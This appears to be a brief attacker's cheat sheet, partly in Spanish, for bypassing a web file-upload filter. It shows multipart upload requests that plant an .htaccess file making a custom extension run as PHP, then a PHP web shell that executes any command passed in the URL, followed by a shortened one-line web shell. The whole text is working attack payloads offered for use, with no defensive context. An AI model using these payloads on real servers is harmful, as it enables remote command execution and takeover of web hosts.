-- -
1. Content-Disposition: form-data; name="fileToUpload"; filename=".htaccess" 
    Content-Type: text/plain
    AddType application/x-httpd-php .test 
2. 
	Content-Disposition: form-data; name="fileToUpload"; filename="cmd.test" 
	Content-Type: application/x-php
	
	<?php
		system($_GET['cmd']);
	?>
==webshell super acortada:==
<?=`$_GET[0]`?>

